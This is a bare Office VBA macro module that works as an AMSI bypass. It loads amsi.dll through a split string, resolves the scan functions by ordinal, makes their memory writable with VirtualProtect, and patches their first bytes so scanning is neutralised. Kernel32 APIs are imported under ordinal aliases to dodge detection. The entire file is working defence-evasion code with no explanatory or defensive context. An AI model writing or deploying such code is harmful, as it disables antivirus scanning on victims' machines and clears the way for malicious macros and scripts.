Attribute VB_Name = "Module1"
'GetProcessAddress
Private Declare PtrSafe Function GPA Lib "kernel32" Alias "#689" ( _
                 ByVal hModule As Long, _
                 ByVal lpProcName As Long) As Long

'LoadLibrary
Private Declare PtrSafe Function LL Lib "kernel32" _
                 Alias "#963" ( _
                 ByVal lpLibFileName As String) As Long
'VirtualProtect
Private Declare PtrSafe Function VPM Lib "kernel32" Alias "#1486" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long

'RTLFillMemory
Private Declare PtrSafe Sub Swapper Lib "kernel32.dll" Alias "#1234" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
    
    
Sub Use()

    Dim hMod As Long
    Dim size As Long
    
    Dim AsString_OrdinalNumber As Long
    Dim AsString_FuncPointer As Long
    
    Dim AsBuffer_OrdinalNumber As Long
    Dim AsBuffer_FuncPointer As Long
    
    hMod = LL("am" + "si" + ".dll")
    
    AsString_OrdinalNumber = 5
    AsString_FuncPointer = GPA(hMod, AsString_OrdinalNumber)
    Debug.Print Hex(AsString_FuncPointer)

    AsBuffer_OrdinalNumber = 4
    AsBuffer_FuncPointer = GPA(hMod, AsBuffer_OrdinalNumber)
    Debug.Print Hex(AsBuffer_FuncPointer)

    'Sort out SS
    a = VPM(ByVal (AsString_FuncPointer), 3, 64, 0)
    Swapper ByVal (AsString_FuncPointer + 0), 1, Val("&H" & "90")
    Swapper ByVal (AsString_FuncPointer + 1), 1, Val("&H" & "31")
    Swapper ByVal (AsString_FuncPointer + 2), 1, Val("&H" & "D2")

    'Sort out SB
    a = VPM(ByVal (AsBuffer_FuncPointer), 3, 64, 0)
    Swapper ByVal (AsBuffer_FuncPointer + 0), 1, Val("&H" & "90")
    Swapper ByVal (AsBuffer_FuncPointer + 1), 1, Val("&H" & "31")
    Swapper ByVal (AsBuffer_FuncPointer + 2), 1, Val("&H" & "C0")

End Sub

